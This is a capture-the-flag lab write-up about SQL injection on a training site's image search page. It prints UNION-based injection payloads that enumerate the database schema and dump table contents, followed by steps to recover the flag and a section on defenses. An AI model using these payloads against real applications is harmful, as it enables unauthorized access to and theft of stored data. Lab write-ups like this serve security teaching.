# 💉 SQL Image Injection

## 📖 Definition

An **SQL Injection** breach is a type of cyberattack where an attacker exploits vulnerabilities in a web application’s database query handling by injecting malicious SQL statements into input fields. These injected queries manipulate the database to reveal, alter, or delete sensitive information without proper authorization.

**Key Characteristics of an SQL Injection:**

1. **Database Manipulation:** Attackers inject SQL commands into input fields (e.g., login forms, search bars) to manipulate the database directly, bypassing application logic.

2. **Sensitive Data Exposure:** Exploited queries may reveal critical information such as table structures, user credentials, and other confidential data stored in the database.

3. **Target of Exploitation:** SQL Injection exploits applications that fail to properly sanitize or validate user input before embedding it into SQL queries.

4. **Common Techniques:**
	- **Union-Based Injection:** Combines results from malicious queries with legitimate ones using UNION statements.
	- **Error-Based Injection:** Forces the application to display database errors that reveal useful information.
	- **Blind SQL Injection:** Exploits true/false conditions in the application to deduce database details without direct feedback.

## 🔍 Discovery

We navigate to the **Search Image** page and consedering liabilities, we try to enter `1` in the input and then we see that the page display the SQL injection query fragment. So we decide to try to list the names of all tables and their associated columns present in the database with this command:

```sql
1 UNION select table_name, column_name FROM information_schema.columns
```

It works because we get hundreds of outputs like this:

```Text
ID: 1 UNION select table_name, column_name FROM information_schema.columns 
Title: id
Url : list_images
```

And as you can see, there is a `list_images` table. As we're looking for images, it's perfect. So then, we try to retrieve all values from the `url` and `comment` columns thanks to:

```sql
1 UNION select url, comment FROM list_images
```

And then we get some other inputs but one is particularly interesting:

```Text
ID: 1 UNION select url, comment FROM list_images 
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : borntosec.ddns.net/images.png
```

So we simply decrypt the password using MD5, lower all the characters and then encrypt it in SHA-256 and we get our flag!

## 🏁 Flag

1. Go on **Search Image** page.
2. Display the names of tables and columns in the database using `1 UNION select table_name, column_name FROM information_schema.columns`.
3. Retrieve values from the `url` and `comment` columns of the `list_images` table using `1 UNION select url, comment FROM list_images`.
4. Decrypt the password using MD5, lower all the characters and then encrypt it in SHA-256.

## 🔧 Patch

Many defensive measures can be taken, but here are the main ones:

1. **Use Parameterized Queries (Prepared Statements)**
	- Replace dynamic SQL queries with parameterized queries or prepared statements.
2. **Implement Input Validation and Sanitization**
	- Validate all user inputs to ensure they conform to expected formats (e.g., numbers, email addresses).
	- Sanitize inputs by escaping special SQL characters if direct parameterization is unavailable.
3. **Employ an ORM (Object-Relational Mapping) Framework**
	- Use ORM tools like SQLAlchemy (Python), Hibernate (Java), or Entity Framework (C#) to abstract database interactions.
	- ORMs automatically parameterize queries and reduce the likelihood of injection.
4. **Limit Database Privileges**
	- Follow the Principle of Least Privilege:
		- Assign each application user the minimum permissions necessary.
		- Avoid using highly privileged accounts (e.g., `root`) in application database connections.

## 📚 References

- [SQL Injection (OWASP)](https://owasp.org/www-community/attacks/SQL_Injection)
- [Testing for SQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
- [SQL injections (SQLi): principles, impacts, exploitations and security best practices (Vaadata)](https://www.vaadata.com/blog/sql-injections-principles-impacts-exploitations-security-best-practices/)

